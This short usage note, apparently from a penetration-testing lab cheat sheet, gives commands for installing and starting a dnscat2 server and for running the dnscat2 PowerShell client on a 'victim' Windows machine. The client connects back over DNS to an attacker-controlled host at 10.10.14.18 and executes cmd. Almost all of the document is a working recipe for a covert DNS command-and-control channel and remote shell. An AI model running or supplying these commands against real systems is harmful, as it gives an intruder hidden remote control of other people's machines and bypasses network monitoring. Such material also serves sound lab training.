Usage:
```bash
# setup
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# clone powershell (in case victim is windows)
git clone https://github.com/lukebaggett/dnscat2-powershell.git
dnscat2.ps1 # transfer this over

# Start server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
	# we will be provided a secret key which can be used to connect back
```

Connect back with powershell
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```